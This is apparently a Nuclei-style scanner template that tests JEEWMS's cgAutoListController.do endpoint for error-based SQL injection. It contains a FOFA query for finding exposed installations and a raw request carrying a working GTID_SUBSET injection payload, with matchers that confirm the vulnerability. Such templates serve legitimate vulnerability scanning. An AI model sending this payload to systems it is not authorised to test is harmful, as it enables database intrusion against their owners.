id: poc-yaml-jeewms-cgautolistcontroller-sqli
info:
  name: JEEWMS cgAutoListController.do SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: jeewms
    fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{md5(t1)}}'
http:
  - raw:
      - |
        GET /rest/../cgAutoListController.do?datagrid&configId=1%27+AND+GTID_SUBSET%28CONCAT%28md5({{t1}})%2C%28SELECT+%28ELT%284503%3D4503%2C1%29%29%29%2C0x7e%29%2C4503%29--+wnMN HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Exception!"
          - "Malformed GTID set specification"
          - "错误描述"
          - "{{t2}}"
